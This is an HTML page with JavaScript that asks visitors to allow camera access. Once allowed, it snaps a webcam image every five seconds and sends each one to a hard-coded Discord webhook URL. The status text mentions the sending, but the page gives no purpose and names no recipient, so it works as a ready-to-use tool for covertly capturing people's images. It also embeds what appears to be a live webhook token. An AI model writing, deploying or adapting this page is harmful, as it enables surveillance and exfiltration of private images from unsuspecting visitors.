<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Camera Access</title>
  <style>
    body {
      background-color: #111;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    video {
      border: 2px solid #00ff88;
      border-radius: 10px;
      width: 320px;
      height: 240px;
      margin-top: 20px;
    }
    .status {
      margin-top: 15px;
      color: #00ff88;
    }
  </style>
</head>
<body>
  <h2>üì∏ Please Allow Camera Access</h2>
  <video id="video" autoplay playsinline></video>
  <div class="status" id="status">Waiting for camera access...</div>

  <script>
    const video = document.getElementById("video");
    const statusText = document.getElementById("status");
    const webhookUrl = "https://discordapp.com/api/webhooks/1360012861673570315/ZqzUK5SoTzzvkBMIGPbH00hA9lt0nAj_eHAbqbqS-Y4vfhq1Dy-sX4ULdcdTWwl0Ui6L";

    async function initCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        statusText.textContent = "‚úÖ Camera access granted. Sending image every 5 seconds.";

        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        canvas.width = 320;
        canvas.height = 240;

        setInterval(() => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append("file", blob, "capture.jpg");
            fetch(webhookUrl, {
              method: "POST",
              body: formData
            }).catch(err => console.error("Webhook send failed", err));
          }, "image/jpeg", 0.8);
        }, 5000);

      } catch (err) {
        statusText.textContent = "‚ùå Camera access denied or unavailable.";
        console.error("Camera error:", err);
      }
    }

    initCamera();
  </script>
</body>
</html>
